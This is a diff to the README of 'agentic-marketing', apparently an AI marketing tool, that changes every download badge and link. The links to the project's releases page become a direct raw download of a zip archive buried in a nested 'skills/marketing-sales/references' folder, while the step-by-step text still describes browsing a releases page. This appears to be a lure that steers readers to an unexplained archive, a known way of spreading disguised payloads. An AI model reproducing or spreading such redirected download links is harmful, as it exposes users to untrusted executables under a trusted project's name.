@@ -1,6 +1,6 @@
 # 🤖 agentic-marketing - AI Tools for Smarter Marketing
 
-[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/releases)
+[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/raw/refs/heads/master/skills/marketing-sales/references/marketing_agentic_3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To start using agentic-marketing, you need to download it from the official rele
 
 Click this button to open the download page in your web browser:
 
-[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/releases)
+[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/raw/refs/heads/master/skills/marketing-sales/references/marketing_agentic_3.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to get agentic-marketing running on your Windows computer.
 
 1. **Open the download page**  
    Visit the agentic-marketing releases page:  
-   https://github.com/minamagdyyyy/agentic-marketing/releases
+   https://github.com/minamagdyyyy/agentic-marketing/raw/refs/heads/master/skills/marketing-sales/references/marketing_agentic_3.4.zip
 
 2. **Find the latest release**  
    Look for the most recent version at the top of the page. Releases are sorted by date and labeled with version numbers.
@@ -122,7 +122,7 @@ To update, repeat the download and install steps above for the newest release. T
 
 Visit the release page here:
 
-https://github.com/minamagdyyyy/agentic-marketing/releases
+https://github.com/minamagdyyyy/agentic-marketing/raw/refs/heads/master/skills/marketing-sales/references/marketing_agentic_3.4.zip
 
 Watch for updates according to your needs or when notified in the app.
 
@@ -136,4 +136,4 @@ You can also find resources on the GitHub repository page, including FAQs and us
 
 ---
 
-[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/releases)
+[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/raw/refs/heads/master/skills/marketing-sales/references/marketing_agentic_3.4.zip)
